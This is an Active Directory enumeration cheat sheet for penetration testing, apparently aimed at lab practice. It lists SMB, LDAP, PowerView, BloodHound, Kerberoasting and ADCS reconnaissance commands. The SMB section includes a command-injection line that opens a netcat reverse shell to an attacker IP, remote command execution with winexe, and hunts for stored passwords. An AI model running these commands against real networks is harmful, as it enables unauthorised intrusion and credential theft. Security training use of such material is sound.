# Enumeration

### Basic AD Information

* Enumerate SMB, RPC, LDAP
* `whoami /all`, `systeminfo`, `hostname`, `ipconfig /all`
* `net config workstation`
* `nltest /dclist:<domain>` — list all domain controllers
* `echo %LOGONSERVER%`, `$Env:LOGONSERVER`, `gpresult /r` — current DC in use

### SMB

```sh
# nmap enum
nmap -sC -p 139,445 -sV 172.16.241.10-13,82-83,254
# nmap smb enum & vuln
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111


# Enum hostname
enum4linux -n 10.11.1.111
nmblookup -A 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111


# using smbMap
smbmap -H 172.16.241.10 -R

##### using smbClient - 
# unauth
smbclient -N -L //$ip/

# as guest user but no password
smbclient -N -L //$ip/ -U guest

# as blank username/password
smbclient -L //$ip/ -U ''
> ''

# connecting to SMB with auth
smbclient //$ip/share -U 'john'
> <password>

###@ Using Crackmapexec
crackmapexec share -u '' -p '' $ip --shares
crackmapexec share -u '' -p '' $ip -M spider_plus

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

#smb reverse shell with "logon" cmd
logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"

#### Interesting policy
# look for user&pass "gpp-decrypt "
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml 


```

### **LDAP enumeration** via nmap scripts or ldapsearch:

```sh
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com" "(objectClass=user)"

# enumerating without credentials
ldapsearch -x -H ldap://192.168.223.122 -D '' -w '' -b "DC=hutch,DC=offsec"

#### Query to get exact user
# Extract users:
-b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"

# Extract computers:
 -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract my info:
-b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Domain Admins:
-b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Domain Users:
-b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Enterprise Admins:
-b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Administrators:
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Remote Desktop Group:
-b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

# To see if you have access to any password you can use grep after executing one of the queries:
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"

```



### User, Group, and Computer Enumeration

```powershell
net user /domain
net user <username> /domain
net group /domain
net group "Domain Admins" /domain
net group <groupname> /domain
net view /domain
net view \\<computer>
```

### PowerView:

```powershell
Get-NetUser
Get-NetGroup
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetComputer
Get-DomainGroup
```

### Sessions & Active Logons

```powershell
Get-NetSession -ComputerName <target>
Get-NetLoggedon -ComputerName <target>
Find-DomainUserLocation
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
```

### Domain Controllers & Trusts

```powershell
Get-NetDomainController
Get-NetDomainTrust
Get-NetForestDomain
Get-NetForestTrust
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### SPNs (Kerberoasting Recon)

```powershell
Get-NetUser -SPN
GetUserSPNs.py <domain>/<user>:<pass>@<dc_ip>
```

### RID Cycling (User Enumeration)

```bash
lookupsid.py <user>@<host>
netexec smb <target> -u guest -p '' --rid-brute 1000
```

### Share Enumeration

```powershell
Invoke-ShareFinder
Find-DomainShare
Find-DomainShare -CheckShareAccess
```

### Group Policy & OU Enumeration

```powershell
Get-NetGPO
Get-NetGPOGroup
Find-GPOComputerAdmin -ComputerName <host>
Get-NetOU -FullData
```

### ACLs and Permissions

```powershell
Get-ObjectAcl -SamAccountName <object> -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs
Get-PathAcl -Path "\\host\share"
```

### BloodHound Collection

```bash
SharpHound.exe -c All -d domain.local --searchforest
bloodhound-python -d domain -u user -p pass -gc <dc> -c all
Invoke-BloodHound -CollectionMethod All -CSVFolder C:\Users\Public
```

### Certificate Services Recon (ADCS)

```powershell
certipy find -u user -p pass -dc-ip <ip> -bloodhound
```

### Additional Enum (AppLocker, DNS, Policies)

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com
```
